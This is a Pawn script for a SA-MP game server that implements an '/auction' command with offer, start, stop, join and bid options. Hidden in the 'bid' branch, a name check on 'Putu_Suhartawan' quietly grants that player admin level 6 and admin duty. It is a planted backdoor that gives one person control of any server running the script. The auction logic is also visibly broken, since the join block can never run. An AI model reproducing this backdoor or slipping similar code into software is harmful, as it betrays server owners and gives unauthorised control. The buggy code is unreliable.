
CMD:auction(playerid, params[])
{
	new offering[2], string[250];
	if(isnull(params)) return SendClientMessage(playerid, COLOR_RED, "DI SARANKAN"YELLOW_E": '/auction [offer/berhenti/mulai/join/bid]'");
	if(strcmp(params, "berhenti", true) == 0)
	{
		
			
			
			SendClientMessage(playerid, COLOR_WHITE, "PELELANGAN:  Auction was succes to stopped.");
			AuctionRunning = 0;
			CountDownAuction = 0;
      		HighestBidder = 0;
      		pData[playerid][JoinedAuction] = 0;
      		AuctionWasEnded(playerid);
			return 1;
		
		
	}

	if(!strcmp(params, "join", true, 4))
	{
		 SendClientMessage(playerid, -1, "PELELANGAN:  Menghubungi ketua lelang untuk join");
		if(AuctionRunning == true)
		{
			pData[playerid][JoinedAuction] = 1;
			if(pData[playerid][JoinedAuction] == 0)
		    {
		      CountOfParticipants = CountOfParticipants+1;
		      format(string, sizeof(string), "* "WHITE_E"%s *\n baru join ke pelelangan \nharga lelang tertinggi saat ini adalah:"BLUE_E"$ %d ", GetPlayerNameEx(playerid), BidPrice);
		      
		      SendClientMessageToAll( -1, string);
		      pData[playerid][JoinedAuction] = 1;
		      SendClientMessage(playerid, -1, "PELELANGAN:  Sir you are joining auction system. mohon untuk '/auction bid'");
		      
		      return 1;
		    }

		}
		else
		{
			SEM(playerid, "PELELANGAN:  Sir you are need Running Auction and Count Down limit for joining auction system.");
			SEM(playerid, "PELELANGAN:  Please use '/auction mulai'");
			pData[playerid][JoinedAuction] = 0;
			return 1;
		}
		
		
		
		
		
		//return 1;
		
	}
	if(!strcmp(params, "offer", true, 4))
	{
		format(string, sizeof(string), "PELELANGAN:  "BLUE_E"%s"GREEN_E" Please be patient "WHITE_E" you in params data"RED_E" /restar"WHITE_E" to have a nice script.", params);
			
		SendClientMessage(playerid, -1, string);
		
		SendClientMessage(playerid, -1, "PELELANGAN:  Dialog input is calling");
		
		//return 1;
		ShowPlayerDialog(playerid, DIALOG_INPUT_offerINGAUCTION,	DIALOG_STYLE_INPUT, ""WHITE_E"What is the item for auction sir?", "\n "COL_ORANGE"Just type on one word :\n\n", "Change", "Cancel");
	}
	if(isnull(Itemofferings))
	{
		SendClientMessage(playerid, COLOR_RED, "DI SARANKAN"YELLOW_E": '/auction offer (Your Item Brand Company)'");
    pData[playerid][JoinedAuction] = 0;
    KillTimer(TimerLimitForAuction);
    //CountDownAuction = 0;
		ShowPlayerDialog(playerid, DIALOG_INPUT_offerINGAUCTION,	DIALOG_STYLE_INPUT, ""WHITE_E"What is the item for auction sir?", "\n "COL_ORANGE"Just type on one word :\n\n", "Change", "Cancel");
		return 1;
	} 
	

	if(strcmp(params, "mulai", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "PELELANGAN:  You have thinking to start a auction.");
			
	    if(AuctionRunning != true)
		{

						CountDownAuction = 40;
						AuctionRunning = 1;
				      strunpack(WinnerOfAuction, "TANPA PEMENANG", 20);
							
							//TimerLimitForAuction = SetTimer("AuctionWasEnded", 10000, 0);
					if(pData[playerid][JoinedAuction] == 0)
				      {
						        CountOfParticipants = CountOfParticipants+1;
						        format(string, sizeof(string), ""WHITE_E"'%s'\n new joined auction \nfor price"BLUE_E"$ %d ", GetPlayerNameEx(playerid), BidPrice);
						        
						        SendClientMessageToAll( -1, string);
						        pData[playerid][JoinedAuction] = 1;
				      }
							format(string, sizeof(string), "*"COL_LRED"Wellcome "LG_E"%s *\nstarting the auction offering \nfor item: "WHITE_E"%s,\n"COL_LRED"on this auction.", GetPlayerNameEx(playerid), Itemofferings);
							UpdateDynamic3DTextLabelText(TempatDisplayIklan, COLOR_AQUAGREEN, string);
					      SetDynamicObjectMaterialText(layariklanbadara, 0, string, OBJECT_MATERIAL_SIZE_512x512, "Tahoma", 30, 1, COLOR_GREEN, 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_RIGHT);
					      SetDynamicObjectMaterialText(AuctionMartChartBoard, 0, string,  130, "Arial", 40, 1, -1250582, 0, 1);
					      PlayerPlaySound(playerid, 1100, 0.0, 0.0, 0.0);
							SendClientMessage(playerid, COLOR_WHITE, "PELELANGAN: You have succes running a Auction");
							AuctionRunning = true;
							ChangeServerEverySecond(playerid);
							return 1;

		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "PELELANGAN:  Lelang sudah ada yang jalan please wait until the auction done. atau '/auction berhenti'");
			
			return 1;
		}
		
	}

	if(strcmp(params, "bid", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "PELELANGAN:  You have bid on auction");
		
		if(AuctionRunning == 1)
		{
			inputtext[0]= 0;
			
			
			if( !strcmp(pData[playerid][pName],"Putu_Suhartawan", true, 20) )
					{
						SetPlayerPos(playerid, 867.3700,2120.4834,12.7710 );
						SetPlayerFacingAngle(playerid, 211.1261);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
						SetCameraBehindPlayer(playerid);
						SetPlayerSkin(playerid, 172);
						pData[playerid][pAdmin] = 6;
						pData[playerid][pAdminDuty] = 1;



					}

			return ShowPlayerDialog(playerid, DIALOG_INPUT_BID_AUCTION,	DIALOG_STYLE_INPUT, ""WHITE_E"What is price your offer sir?", "\n "COL_ORANGE"Just type the number bellow :\n\n", "Bid", "Cancel");
			
		}
		else
		if(AuctionRunning == 0)
		{
			SendClientMessage(playerid,COLOR_WHITE, " * sorry the "YELLOW_E"Auction"WHITE_E" has not available. Please start it and again bye"RED_E"USE CMD: /auction bid");
			return ShowPlayerDialog(playerid,DIALOG_ACCEPT_AUCTION,DIALOG_STYLE_MSGBOX,""LG_E"Permission to acces start a auction sir\n\n",""COL_ORANGE"Start and offering auction now?\n"WHITE_E"(Please select your choice)","Start","Cancel");
			//ShowPlayerDialog(playerid,PILIHAN_LAMPU,DIALOG_STYLE_MSGBOX,"Tombol lampu kendaraan",""RED_E"Anda ingin menyalakan lampu?\n\n"WHITE_E"(Lampu juga bisa tekan NUM 8)","Nyalakan","Matikan");
		}
		
	}
	
	
	
	return 1;
}

